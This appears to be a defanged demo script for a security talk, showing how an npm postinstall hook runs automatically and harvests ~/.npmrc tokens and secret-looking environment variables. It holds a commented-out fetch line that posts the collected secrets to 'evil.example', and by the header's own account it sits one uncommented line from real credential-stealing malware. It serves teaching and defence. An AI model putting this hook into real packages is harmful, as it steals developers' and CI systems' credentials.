#!/usr/bin/env node
/*
 * DEMO 1 — "a postinstall that reads your secrets"
 * -------------------------------------------------
 * This is the payload that npm runs AUTOMATICALLY after `npm install`,
 * because package.json declares it as a "postinstall" script.
 *
 * It is intentionally DEFANGED for a live talk:
 *   - it reads from a SANDBOX home dir (HOME is overridden by run.sh),
 *     so it never touches the presenter's real ~/.npmrc
 *   - it only PRINTS what it found, to show the secrets are in plain text
 *   - it does NOT send anything anywhere (the exfil line is commented out)
 *
 * Real malware changes two things: it reads your REAL home dir, and it
 * uncomments the fetch(). That is the entire difference.
 */
const fs = require("fs");
const os = require("os");
const path = require("path");

const line = "─".repeat(64);
console.log("\n" + line);
console.log("  [postinstall] running automatically after `npm install`");
console.log("  pid:", process.pid, " cwd:", process.cwd());
console.log(line);

// 1) The npm auth token — sits in ~/.npmrc in PLAIN TEXT
const npmrcPath = path.join(os.homedir(), ".npmrc");
let npmrc = "";
try {
  npmrc = fs.readFileSync(npmrcPath, "utf8");
  console.log("\n  Found " + npmrcPath + " (plain text):\n");
  console.log(npmrc.replace(/^/gm, "    "));
} catch (e) {
  console.log("\n  (no .npmrc in " + os.homedir() + ")");
}

// 2) Every secret the shell / CI kindly exported into the environment
const interesting = Object.entries(process.env).filter(([k]) =>
  /TOKEN|SECRET|PASSWORD|KEY|AWS|NPM|DB_|API/i.test(k)
);
console.log("\n  Secrets just sitting in process.env (plain text):\n");
if (interesting.length === 0) {
  console.log("    (none — run via ./run.sh to populate the sandbox)");
} else {
  for (const [k, v] of interesting) console.log("    " + k + "=" + v);
}

// 3) What real malware does next — kept inert on purpose
const loot = JSON.stringify({ npmrc, env: Object.fromEntries(interesting) });
console.log("\n  [would exfiltrate " + loot.length + " bytes]");
// await fetch("https://evil.example/collect", { method: "POST", body: loot });

console.log("\n" + line);
console.log("  No rootkit. No CVE. Just one postinstall hook.");
console.log("  Mitigation shown on the slides: npm ci --ignore-scripts");
console.log(line + "\n");
